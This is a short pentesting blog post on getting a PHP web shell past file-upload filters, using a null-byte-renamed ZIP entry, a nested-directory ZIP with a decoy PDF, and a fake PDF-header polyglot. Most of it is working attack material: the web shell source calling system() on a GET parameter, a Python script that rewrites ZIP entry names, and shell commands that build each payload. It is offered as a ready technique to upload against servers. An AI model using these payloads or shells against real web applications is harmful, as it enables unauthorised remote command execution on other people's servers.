---
title: "Web Shell via Polyglot ZIP + PDF Upload Bypass"
description: "Bypassing file upload filters using ZIP/PDF polyglots or directory tricks."
date: 2025-06-10T10:00:00+05:30
categories:
  - hacking
tags:
  - foothold
  - webshell
  - linux
  - pentesting
  - bypass
---

# Technique 1: Null Byte Bypass (\x00)
Create a fake `.pdf` that contains a valid header, and append a .php shell:
```bash
❯ cat shell.php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
❯ zip shell.zip 'shell.php'
  adding: shell.php (deflated 32%)
```
Then convert the name with the python code to add null character

*renamer.py*{: .highlight}
```python
import zipfile

zip_path = 'shell.zip'
new_zip_path = 'shell2.zip'
old_filename = 'shell.php'
new_filename = 'shell.php\x00.pdf'

with zipfile.ZipFile(zip_path, 'r') as zip_read:
    with zipfile.ZipFile(new_zip_path, 'w') as zip_write:
        for item in zip_read.infolist():
            data = zip_read.read(item.filename)
            if item.filename == old_filename:
                item.filename = new_filename
            zip_write.writestr(item, data)

print(f'Renamed {old_filename} to {new_filename} inside {new_zip_path}')

```
```bash
❯ python3 renamer.py
```
Upload shell2.zip

# Nested Directory + Web Shell Trick
Structure:
```bash
payload.zip
├── good.pdf
└── folder/
    └── shell.php
```
This bypasses naive extension or path checks. When extracted:
- good.pdf is used for validation
- Attacker accesses: payload.zip/folder/shell.php on the server

Create it:
```bash
mkdir payload
cp good.pdf payload/
mkdir payload/folder
cp shell.php payload/folder/
zip -r payload.zip payload
```
Upload payload.zip and hope the backend extracts and serves all content.

# Polyglot Payload — Fake PDF + Web Shell
Create a fake `.pdf` that contains a valid header, and append a .php shell:
```bash
echo "%PDF-1.4" > legit.pdf
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
cat legit.pdf shell.php > payload.php
```
Sometimes servers check only the file header or MIME — this can pass as PDF but execute as PHP if interpreted that way.